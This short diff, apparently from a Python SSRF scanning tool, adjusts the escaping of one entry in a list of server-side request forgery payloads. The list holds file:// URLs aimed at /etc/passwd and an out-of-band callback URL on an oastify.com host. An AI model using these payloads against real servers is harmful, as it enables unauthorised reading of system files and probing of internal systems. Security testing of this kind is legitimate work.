@@ -16,7 +16,7 @@ init(autoreset=True)
 # Configuration
 SSRF_PAYLOADS = [
     'file:///etc/passwd',
-    'file://\/\/etc/passwd',
+    'file://\\/\\/etc/passwd',
     'file://etc/passwd',
     'http://wmmxwwl7n8vhv62wptl0tq936uck09.oastify.com',
     'file:/etc/passwd',
